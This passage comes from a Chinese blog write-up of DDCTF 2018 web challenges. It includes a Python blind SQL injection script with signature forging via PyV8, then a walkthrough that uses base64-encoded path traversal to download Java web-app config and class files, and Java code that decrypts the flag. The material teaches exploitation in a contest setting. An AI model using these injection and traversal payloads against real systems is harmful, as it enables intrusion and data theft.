class="line"><span class="string">          opad = Array(16);</span></div><div class="line"><span class="string">         for (var i = 0; i &lt; 16; i++) &#123;</span></div><div class="line"><span class="string">          ipad[i] = bkey[i] ^ 0x36363636;</span></div><div class="line"><span class="string">          opad[i] = bkey[i] ^ 0x5C5C5C5C;</span></div><div class="line"><span class="string">         &#125;</span></div><div class="line"><span class="string">         var hash = core_math_enc(ipad.concat(str2binb(data)), 512 + data.length * chrsz);</span></div><div class="line"><span class="string">         return core_math_enc(opad.concat(hash), 512 + 160);</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        /*</span></div><div class="line"><span class="string">         * Add integers, wrapping at 2^32. This uses 16-bit operations internally</span></div><div class="line"><span class="string">         * to work around bugs in some JS interpreters.</span></div><div class="line"><span class="string">         */</span></div><div class="line"><span class="string">        function safe_add(x, y) &#123;</span></div><div class="line"><span class="string">         var lsw = (x &amp; 0xFFFF) + (y &amp; 0xFFFF);</span></div><div class="line"><span class="string">         var msw = (x &gt;&gt; 16) + (y &gt;&gt; 16) + (lsw &gt;&gt; 16);</span></div><div class="line"><span class="string">         return (msw &lt;&lt; 16) | (lsw &amp; 0xFFFF);</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        /*</span></div><div class="line"><span class="string">         * Bitwise rotate a 32-bit number to the left.</span></div><div class="line"><span class="string">         */</span></div><div class="line"><span class="string">        function rol(num, cnt) &#123;</span></div><div class="line"><span class="string">         return (num &lt;&lt; cnt) | (num &gt;&gt;&gt; (32 - cnt));</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        /*</span></div><div class="line"><span class="string">         * Convert an 8-bit or 16-bit string to an array of big-endian words</span></div><div class="line"><span class="string">         * In 8-bit function, characters &gt;255 have their hi-byte silently ignored.</span></div><div class="line"><span class="string">         */</span></div><div class="line"><span class="string">        function str2binb(str) &#123;</span></div><div class="line"><span class="string">         var bin = Array();</span></div><div class="line"><span class="string">         var mask = (1 &lt;&lt; chrsz) - 1;</span></div><div class="line"><span class="string">         for (var i = 0; i &lt; str.length * chrsz; i += chrsz)</span></div><div class="line"><span class="string">         bin[i &gt;&gt; 5] |= (str.charCodeAt(i / chrsz) &amp; mask) &lt;&lt; (24 - i % 32);</span></div><div class="line"><span class="string">         return bin;</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        /*</span></div><div class="line"><span class="string">         * Convert an array of big-endian words to a string</span></div><div class="line"><span class="string">         */</span></div><div class="line"><span class="string">        function binb2str(bin) &#123;</span></div><div class="line"><span class="string">         var str = "";</span></div><div class="line"><span class="string">         var mask = (1 &lt;&lt; chrsz) - 1;</span></div><div class="line"><span class="string">         for (var i = 0; i &lt; bin.length * 32; i += chrsz)</span></div><div class="line"><span class="string">         str += String.fromCharCode((bin[i &gt;&gt; 5] &gt;&gt;&gt; (24 - i % 32)) &amp; mask);</span></div><div class="line"><span class="string">         return str;</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        /*</span></div><div class="line"><span class="string">         * Convert an array of big-endian words to a hex string.</span></div><div class="line"><span class="string">         */</span></div><div class="line"><span class="string">        function binb2hex(binarray) &#123;</span></div><div class="line"><span class="string">         var hex_tab = hexcase ? "0123456789ABCDEF" : "0123456789abcdef";</span></div><div class="line"><span class="string">         var str = "";</span></div><div class="line"><span class="string">         for (var i = 0; i &lt; binarray.length * 4; i++) &#123;</span></div><div class="line"><span class="string">          str += hex_tab.charAt((binarray[i &gt;&gt; 2] &gt;&gt; ((3 - i % 4) * 8 + 4)) &amp; 0xF) + hex_tab.charAt((binarray[i &gt;&gt; 2] &gt;&gt; ((3 - i % 4) * 8)) &amp; 0xF);</span></div><div class="line"><span class="string">         &#125;</span></div><div class="line"><span class="string">         return str;</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        /*</span></div><div class="line"><span class="string">         * Convert an array of big-endian words to a base-64 string</span></div><div class="line"><span class="string">         */</span></div><div class="line"><span class="string">        function binb2b64(binarray) &#123;</span></div><div class="line"><span class="string">         var tab = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";</span></div><div class="line"><span class="string">         var str = "";</span></div><div class="line"><span class="string">         for (var i = 0; i &lt; binarray.length * 4; i += 3) &#123;</span></div><div class="line"><span class="string">          var triplet = (((binarray[i &gt;&gt; 2] &gt;&gt; 8 * (3 - i % 4)) &amp; 0xFF) &lt;&lt; 16) | (((binarray[i + 1 &gt;&gt; 2] &gt;&gt; 8 * (3 - (i + 1) % 4)) &amp; 0xFF) &lt;&lt; 8) | ((binarray[i + 2 &gt;&gt; 2] &gt;&gt; 8 * (3 - (i + 2) % 4)) &amp; 0xFF);</span></div><div class="line"><span class="string">          for (var j = 0; j &lt; 4; j++) &#123;</span></div><div class="line"><span class="string">           if (i * 8 + j * 6 &gt; binarray.length * 32) str += b64pad;</span></div><div class="line"><span class="string">           else str += tab.charAt((triplet &gt;&gt; 6 * (3 - j)) &amp; 0x3F);</span></div><div class="line"><span class="string">          &#125;</span></div><div class="line"><span class="string">         &#125;</span></div><div class="line"><span class="string">         return str;</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        var obj = &#123;</span></div><div class="line"><span class="string">            id: id_wz,</span></div><div class="line"><span class="string">            title: title_wz,</span></div><div class="line"><span class="string">            author: author_wz,</span></div><div class="line"><span class="string">            date: date_wz,</span></div><div class="line"><span class="string">            //time : times</span></div><div class="line"><span class="string">            time : parseInt(new Date().getTime() / 1000-100)</span></div><div class="line"><span class="string">        &#125;;</span></div><div class="line"><span class="string">        function signGenerate(obj,key) &#123;</span></div><div class="line"><span class="string">        </span></div><div class="line"><span class="string">            var str0 = '';</span></div><div class="line"><span class="string">            for (i in obj) &#123;</span></div><div class="line"><span class="string">                if (i != 'sign') &#123;</span></div><div class="line"><span class="string">                    str1 = '';</span></div><div class="line"><span class="string">                    str1 = i + '=' + obj[i];</span></div><div class="line"><span class="string">                    str0 += str1</span></div><div class="line"><span class="string">                &#125;</span></div><div class="line"><span class="string">            &#125;</span></div><div class="line"><span class="string">            return hex_math_enc(str0 + key)</span></div><div class="line"><span class="string">        &#125;;</span></div><div class="line"><span class="string">        </span></div><div class="line"><span class="string">        (signGenerate(obj,key));</span></div><div class="line"><span class="string">        '''</span>)</div><div class="line">    vars = ctxt.locals</div><div class="line">    <span class="keyword">return</span> func, vars.obj.time, vars.id_wz, vars.author_wz, vars.date_wz, vars.title_wz</div><div class="line"></div><div class="line"></div><div class="line">url = <span class="string">'http://116.85.43.88:8080/ZVDHKBUVUZSTJCNX/dfe3ia/index.php'</span></div><div class="line">hea = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"</span>,</div><div class="line">       <span class="string">"X-forwarded-for"</span>: <span class="string">"123.232.23.245"</span>&#125;</div><div class="line"></div><div class="line">l = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>]</div><div class="line">payload = <span class="string">'\'and ord(mid((select secvalue from  ctf_key5 limit &#123;&#125;,1),&#123;&#125;,1))&amp;&#123;&#125; #'</span></div><div class="line"></div><div class="line"><span class="comment"># '\'and ord(mid((select schema_name from information_schema.schemata limit &#123;&#125;,1),&#123;&#125;,1))&amp;&#123;&#125; #'</span></div><div class="line"><span class="comment"># information_schema</span></div><div class="line"><span class="comment"># ddctf</span></div><div class="line"></div><div class="line"><span class="comment"># '\'and ord(mid((select table_name from information_schema.tables where table_schema like 0x6464637466 limit &#123;&#125;,1),&#123;&#125;,1))&amp;&#123;&#125; #'</span></div><div class="line"><span class="comment"># ctf_key5</span></div><div class="line"></div><div class="line"><span class="comment"># '\'and ord(mid((select column_name from information_schema.columns where table_name like 0x6374665f6b657935 limit &#123;&#125;,1),&#123;&#125;,1))&amp;&#123;&#125; #'</span></div><div class="line"><span class="comment"># secvalue</span></div><div class="line"></div><div class="line"><span class="comment"># '\'and ord(mid((select secvalue from  ctf_key5 limit &#123;&#125;,1),&#123;&#125;,1))&amp;&#123;&#125; #'</span></div><div class="line"><span class="comment"># DDCTF&#123;ZJKGOFGPHSLJHIYG&#125;</span></div><div class="line"></div><div class="line"></div><div class="line">str1 = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">100</span>):<span class="comment">#limit offset</span></div><div class="line">    str1 = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):<span class="comment">#string offset</span></div><div class="line">        n = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> l:<span class="comment"># 按位与</span></div><div class="line">            para = js(author=payload.format(t, j, i))</div><div class="line">            pad = <span class="string">"?sig="</span> + str(para[<span class="number">0</span>]) + <span class="string">"&amp;time="</span> + str(para[<span class="number">1</span>])</div><div class="line">            data = &#123;<span class="string">'id'</span>: para[<span class="number">2</span>], <span class="string">'author'</span>: para[<span class="number">3</span>], <span class="string">'date'</span>: para[<span class="number">4</span>], <span class="string">'title'</span>: para[<span class="number">5</span>], <span class="string">'time'</span>: str(para[<span class="number">1</span>])&#125;</div><div class="line">            <span class="comment"># 2420</span></div><div class="line">            result = requests.post(url + pad, headers=hea, data=data).text</div><div class="line">            <span class="keyword">if</span> len(result) == <span class="number">2420</span>:</div><div class="line">                n += i</div><div class="line">        length = len(str1)</div><div class="line">        str1 += chr(n) <span class="keyword">if</span> n != <span class="number">0</span> <span class="keyword">else</span> <span class="string">""</span></div><div class="line">        <span class="keyword">print</span> str1</div><div class="line">        <span class="keyword">if</span> length == len(str1):</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>这个方法有一点要注意，就是<code>PyV8</code>的<code>JS</code>脚本中的<code>new Date().getTime() / 1000</code>会与服务器或者浏览器获取的时间有误差，会快那么个一两百，当时我写完之后就一直提示<code>time error</code>，花了接近三个小时Debug，最后对比从浏览器获取的时间发现快了一两百秒，然后我就默默的手动加上了一句<code>-300</code>就成功了。这次复现又变成<code>-100</code>才能正确了，这是一个坑点2333<br>看到有的师傅是直接把源码下载到本地然后搭好本地环境，写一个本地的php脚本，接受那几个参数，然后通过curl这类函数将得到的参数进行转发，然后用sqlmap直接渗透本地的php。这个思路也很行。（想起来有好久都没有用过sqlmap了）</p>
<h4 id="Web2-专属链接"><a href="#Web2-专属链接" class="headerlink" title="Web2 - 专属链接"></a>Web2 - 专属链接</h4><p>这一题很不错，脑洞很大，但是不失度<br>主要还是对jsp这方面接触很少，而且本学期才开始学的java，2333<br>但是由于语法跟C++差不多，多多少少还是能看懂的<br>说题目吧<br>首先是一个静态页面，啥也找不出来，卡了很久</p>
<img src="/2018/04/21/又是一年DDCTF/13-49-53.jpg" alt="13-49-53.jpg" title="">
<p>一开始顺着提示——专属登录链接，然后再源码里面找到了<code>&lt;meta property=&quot;qc:admins&quot; content=&quot;36510766376011725352163757752314571645060454&quot;/&gt;</code>还以为什么QQ平台第三方登录漏洞什么的，后来发现是纯粹浪费时间= =<br>首页源码提示<code>&lt;!--/flag/testflag/yourflag--&gt;</code></p>
<img src="/2018/04/21/又是一年DDCTF/21-36-06.jpg" alt="21-36-06.jpg" title="">
<p>访问之</p>
<img src="/2018/04/21/又是一年DDCTF/21-37-04.jpg" alt="21-37-04.jpg" title="">
<p>提示<code>java.lang.ArrayIndexOutOfBoundsException</code><br>尝试了很久得出这样的一个访问链接<code>http://116.85.48.102:5050/flag/testflag/{fasfasf}</code><br>得到下列错误<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:<span class="number">65</span>)</div><div class="line">	java.base/java.lang.Long.parseLong(Long.java:<span class="number">692</span>)</div><div class="line">	java.base/java.lang.Long.valueOf(Long.java:<span class="number">1144</span>)</div><div class="line">	com.didichuxing.ctf.controller.user.FlagController.submitFlag(FlagController.java:<span class="number">36</span>)</div></pre></td></tr></table></figure></p>
<p>我们只能得到有个<code>com.didichuxing.ctf.controller.user.FlagController</code>这个类名，还有这个大括号里面是要求一个long<br>然后我尝试爆破long，失败，毕竟long这么大，还以为是啥小点的数，因为实在是没啥思路</p>
<p>后来发现这个提示——“专属登录链接”的作用是叫你访问<code>http://116.85.48.102:5050/login</code></p>
<img src="/2018/04/21/又是一年DDCTF/13-53-04.jpg" alt="13-53-04.jpg" title="">
<p>然后找到一个废弃的登录页面，一点用也没有的那种<br>而且这个博客的名字看起来就像乱写的而且没啥特征，看起来去google找也不会找到啥信息<br>然而事实是<code>Github</code>上还真的有源码<a href="https://github.com/xingfly/SBlog" target="_blank" rel="external">https://github.com/xingfly/SBlog</a><br>源码目录结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">─src</div><div class="line">    └─main</div><div class="line">        ├─java</div><div class="line">        │  └─com</div><div class="line">        │      └─xingfly</div><div class="line">        │          ├─controller  </div><div class="line">        │          │  ├─admin      </div><div class="line">        │          │  └─user   </div><div class="line">        │          ├─dao     </div><div class="line">        │          ├─interceptor</div><div class="line">        │          ├─model</div><div class="line">        │          │  └─dto         </div><div class="line">        │          ├─service </div><div class="line">        │          │  └─impl      </div><div class="line">        │          └─util</div><div class="line">        ├─resources</div><div class="line">        │  ├─mapper</div><div class="line">        │  │      AboutMapper.xml</div><div class="line">        │  │      ArticleMapper.xml</div><div class="line">        │  │      CategoryMapper.xml</div><div class="line">        │  │      UserMapper.xml</div><div class="line">        │  │      WebAppMapper.xml</div><div class="line">        │  ├─mybatis</div><div class="line">        │  │      config.xml </div><div class="line">        │  └─properties</div><div class="line">        │          db.properties         </div><div class="line">        └─webapp</div><div class="line">            ├─images</div><div class="line">            ├─static</div><div class="line">            └─WEB-INF</div><div class="line">                │  applicationContext.xml</div><div class="line">                │  mvc-dispatcher-servlet.xml</div><div class="line">                │  web.xml</div><div class="line">                └─pages</div><div class="line">                    ├─admin</div><div class="line">                    │  ├─about     </div><div class="line">                    │  ├─article</div><div class="line">                    │  ├─category </div><div class="line">                    │  ├─home   </div><div class="line">                    │  ├─init</div><div class="line">                    │  └─user</div><div class="line">                    ├─common   </div><div class="line">                    └─user</div></pre></td></tr></table></figure></p>
<p>而在首页，图标出现了奇怪的缺失纹路<br><img src="/2018/04/21/又是一年DDCTF/21-55-22.jpg" alt="21-55-22.jpg" title=""><br>找到对应的ico地址</p>
<img src="/2018/04/21/又是一年DDCTF/21-56-23.jpg" alt="21-56-23.jpg" title="">
<p>下载下来查看发现这个脑洞，emmmm，说实话在比赛的时候我是没有发现的</p>
<img src="/2018/04/21/又是一年DDCTF/21-57-42.jpg" alt="21-57-42.jpg" title="">
<p>然后我们可以知道这个链接就是通往flag的地方了<br><code>http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=</code><br><code>ZmF2aWNvbi5pY28=</code>base64解码之后<code>favicon.ico</code><br>我们结合源码目录和这个路径尝试文件下载<br>查资料发现springmvc+mybatis的访问根目库是在<code>webapp</code>下<br>所以尝试下载<code>../../WEB-INF/applicationContext.xml</code>，访问<code>http://116.85.48.102:5050/image/banner/Li4vLi4vV0VCLUlORi9hcHBsaWNhdGlvbkNvbnRleHQueG1s</code>,发现下载成功<br>然后搜索一下<code>SpringMVC</code>目录结构，由上面得到的<code>com.didichuxing.ctf.controller.user.FlagController</code>尝试下载<code>class</code>目录下的<code>FlagController</code>类。同样地将<code>../../WEB-INF/classes/com/didichuxing/ctf/model/Flagcontroler.class</code>base64转码然后拼接url访问得到源码<br>丢进<code>jd-gui</code>看一下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.didichuxing.ctf.controller.user;</div><div class="line"><span class="keyword">import</span> com.didichuxing.ctf.model.Flag;</div><div class="line"><span class="keyword">import</span> com.didichuxing.ctf.service.FlagService;</div><div class="line"><span class="meta">@RestController</span></div><div class="line"><span class="meta">@RequestMapping</span>(&#123;<span class="string">"flag"</span>&#125;)</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlagController</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">  <span class="meta">@Autowired</span></div><div class="line">  <span class="keyword">private</span> FlagService flagService;</div><div class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/getflag/&#123;email:[0-9a-zA-Z']+&#125;"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;)</div><div class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">getFlag</span><span class="params">(@PathVariable(<span class="string">"email"</span>)</span> String email, ModelMap model)</span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    Flag flag = <span class="keyword">this</span>.flagService.getFlagByEmail(email);</div><div class="line">    <span class="keyword">return</span> <span class="string">"Encrypted flag : "</span> + flag.getFlag();</div><div class="line">  &#125;</div><div class="line">  <span class="meta">@RequestMapping</span>(&#123;<span class="string">"/testflag/&#123;flag&#125;"</span>&#125;)</div><div class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">submitFlag</span><span class="params">(@PathVariable(<span class="string">"flag"</span>)</span> String flag, ModelMap model)</span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    String[] fs = flag.split(<span class="string">"[&#123;&#125;]"</span>);</div><div class="line">    Long longFlag = Long.valueOf(fs[<span class="number">1</span>]);</div><div class="line">    <span class="keyword">int</span> i = <span class="keyword">this</span>.flagService.exist(flag);</div><div class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">return</span> <span class="string">"pass!!!"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="string">"failed!!!"</span>;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>找到了我们之前访问<code>/flag/testflag/{asdf}</code>的逻辑了<br>很明显要得到flag就要看一个<code>flagService.getFlagByEmail()</code>函数以及知道参数<code>email</code>是啥，我们按照上面的方法继续读取<code>flagService</code>类和<code>flag</code>类下来，然后发现<code>flagService</code>类是一个<code>public abstract interface</code>类，就很迷，里面啥代码都没有（其实在对应的mapper.xml里面）<br>将里面的这三个文件下载下来进行分析<br><img src="/2018/04/21/又是一年DDCTF/10-33-28.jpg" alt="10-33-28.jpg" title=""><br>在<code>applicationContext.xml</code>找到初始化类，下载之</p>
<img src="/2018/04/21/又是一年DDCTF/10-48-17.jpg" alt="10-48-17.jpg" title="">
<p>找到flag加密代码逻辑<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span>&#123;</div><div class="line">      <span class="keyword">this</span>.flagService.deleteAll();</div><div class="line">      String path = ctx.getServletContext().getRealPath(<span class="string">"/WEB-INF/classes/emails.txt"</span>);</div><div class="line">      String ksPath = ctx.getServletContext().getRealPath(<span class="string">"/WEB-INF/classes/sdl.ks"</span>);</div><div class="line"></div><div class="line">      String emailsString = FileUtils.readFileToString(<span class="keyword">new</span> File(path), <span class="string">"utf-8"</span>);</div><div class="line">      String[] emails = emailsString.trim().split(<span class="string">"\n"</span>);</div><div class="line"></div><div class="line">      KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</div><div class="line">      FileInputStream inputStream = <span class="keyword">new</span> FileInputStream(ksPath);</div><div class="line">      keyStore.load(inputStream, <span class="keyword">this</span>.p.toCharArray());</div><div class="line">      Key key = keyStore.getKey(<span class="string">"www.didichuxing.com"</span>, <span class="keyword">this</span>.p.toCharArray());</div><div class="line">      Cipher cipher = Cipher.getInstance(key.getAlgorithm());</div><div class="line">      cipher.init(<span class="number">1</span>, key);</div><div class="line">      SecretKeySpec signingKey = <span class="keyword">new</span> SecretKeySpec(<span class="string">"sdl welcome you !"</span>.getBytes(), <span class="string">"HmacSHA256"</span>);</div><div class="line">      Mac mac = Mac.getInstance(<span class="string">"HmacSHA256"</span>);</div><div class="line">      mac.init(signingKey);</div><div class="line">      SecureRandom sr = <span class="keyword">new</span> SecureRandom();</div><div class="line">      <span class="keyword">for</span> (String email : emails) &#123;</div><div class="line">        String flag = <span class="string">"DDCTF&#123;"</span> + Math.abs(sr.nextLong()) + <span class="string">"&#125;"</span>;</div><div class="line">        String uuid = UUID.randomUUID().toString().replace(<span class="string">"-"</span>, <span class="string">"s"</span>);</div><div class="line">        <span class="keyword">byte</span>[] data = cipher.doFinal(flag.getBytes());</div><div class="line">        <span class="keyword">byte</span>[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());</div><div class="line"></div><div class="line">        Flag flago = <span class="keyword">new</span> Flag();</div><div class="line">        flago.setId(Integer.valueOf(id));</div><div class="line">        flago.setFlag(byte2hex(data));</div><div class="line">        flago.setEmail(byte2hex(e));</div><div class="line">        flago.setOriginFlag(flag);</div><div class="line">        flago.setUuid(uuid);</div><div class="line">        flago.setOriginEmail(email);</div><div class="line">        <span class="keyword">this</span>.flagService.save(flago);</div><div class="line">        System.out.println(email + <span class="string">"同学的入口链接为：http://116.85.48.102:5050/welcom/"</span> + uuid);</div><div class="line">        id++;</div><div class="line">        System.out.println(flago);</div><div class="line">      &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>大概意思是取<code>/WEB-INF/classes/emails.txt</code>里面的<code>email</code>然后用密钥<code>sdl welcome you !</code>和加密算法<code>HmacSHA256</code>进行加密，得到<code>flag</code>类里面的<code>email</code>，未加密的<code>email</code>是<code>OriginFlag</code><br>然后将<code>/WEB-INF/classes/sdl.ks</code>文件中提取出来的私钥对一个随机的<code>flag</code>进行签名，然后转为十六进制后存进数据库<br>那么我们的思路就很简单了</p>
<ol>
<li>找到属于我的email</li>
<li>通过加密算法<code>HmacSHA256</code>和密钥<code>sdl welcome you !</code>对email进行加密</li>
<li>结合刚才我们在<code>com.didichuxing.ctf.controller.user.FlagController</code>里面发现的代码逻辑，将第2步得到的<code>email</code>加密值给<code>POST</code>到<code>/flag/getflag/加密的email</code>下，得到加密后的<code>flag</code></li>
<li>同样的方法下载<code>/WEB-INF/classes/sdl.ks</code>，然后提取出公钥，对签名后的<code>flag</code>进行解密</li>
</ol>
<p>然后我第1步就卡住了= =<br>我尝试了很多个email，包括我自己的平台注册<code>email</code>和<a href="mailto:`xxx@didichuxing.com" target="_blank" rel="external">`xxx@didichuxing.com</a><code>这种
然后经Wfox师傅提醒是首页的一个长的离谱的</code>email`才反应过来这个骚套路<br>就是这货</p>
<img src="/2018/04/21/又是一年DDCTF/11-01-58.jpg" alt="11-01-58.jpg" title="">
<img src="/2018/04/21/又是一年DDCTF/11-02-08.jpg" alt="11-02-08.jpg" title="">
<p>然后我们可以直接到这个网站(<a href="http://tool.oschina.net/encrypt?type=2" target="_blank" rel="external">http://tool.oschina.net/encrypt</a>)进行<code>HmacSHA256</code>加密</p>
<img src="/2018/04/21/又是一年DDCTF/11-03-22.jpg" alt="11-03-22.jpg" title="">
<p>用<code>burp</code> <code>POST</code>过去，不出意外地得到了签名后的flag</p>
<img src="/2018/04/21/又是一年DDCTF/11-08-59.jpg" alt="11-08-59.jpg" title="">
<p>然后就是提取公钥解密这个flag了<br>写<code>java</code>这边有点吃力，写了挺久才得到正确解，主要还是这个<code>KeyStore</code>文件提取不了解</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.security.Key;</div><div class="line"><span class="keyword">import</span> java.security.KeyStore;</div><div class="line"><span class="keyword">import</span> javax.crypto.Cipher;</div><div class="line"><span class="keyword">import</span> java.io.FileInputStream;</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</div><div class="line">	<span class="keyword">static</span> String p;</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">		p = <span class="string">"sdl welcome you !"</span>.substring(<span class="number">0</span>, <span class="string">"sdl welcome you !"</span>.length() - <span class="number">1</span>).trim().replace(<span class="string">" "</span>, <span class="string">""</span>);</div><div class="line">		String ksPath = <span class="string">"Path_to_classes_sdl.ks"</span>;</div><div class="line">		<span class="keyword">byte</span>[] data = hex2Bytes(<span class="string">"Your_Encrypted_Flag_HASH_HEX"</span>);</div><div class="line">		KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</div><div class="line">		FileInputStream inputStream = <span class="keyword">new</span> FileInputStream(ksPath);</div><div class="line">		keyStore.load(inputStream, p.toCharArray());</div><div class="line">		Key key = keyStore.getKey(<span class="string">"www.didichuxing.com"</span>, p.toCharArray());</div><div class="line">		Cipher cipher1 = Cipher.getInstance(key.getAlgorithm());</div><div class="line">		Key pubKey = keyStore.getCertificate(<span class="string">"www.didichuxing.com"</span>).getPublicKey();</div><div class="line">		cipher1.init(Cipher.DECRYPT_MODE, pubKey);</div><div class="line">		<span class="keyword">byte</span>[] f = cipher1.doFinal(data);</div><div class="line">		System.out.println(byte2hex(f));</div><div class="line">	&#125;</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">byte2hex</span><span class="params">(<span class="keyword">byte</span>[] b)</span> </span>&#123;</div><div class="line">		StringBuilder hs = <span class="keyword">new</span> StringBuilder();</div><div class="line"></div><div class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">0</span>; (b != <span class="keyword">null</span>) &amp;&amp; (n &lt; b.length); n++) &#123;</div><div class="line">			String stmp = Integer.toHexString(b[n] &amp; <span class="number">0xFF</span>);</div><div class="line">			<span class="keyword">if</span> (stmp.length() == <span class="number">1</span>)</div><div class="line">				hs.append(<span class="string">'0'</span>);</div><div class="line">			hs.append(stmp);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> hs.toString().toUpperCase();</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hex2Bytes(String hexString) &#123;</div><div class="line">		<span class="keyword">if</span> (hexString == <span class="keyword">null</span> || hexString.equals(<span class="string">""</span>)) &#123;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">		&#125;</div><div class="line">		hexString = hexString.toUpperCase();</div><div class="line">		<span class="keyword">int</span> length = hexString.length() / <span class="number">2</span>;</div><div class="line">		<span class="keyword">char</span>[] hexChars = hexString.toCharArray();</div><div class="line">		<span class="keyword">byte</span>[] d = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</div><div class="line">		<span 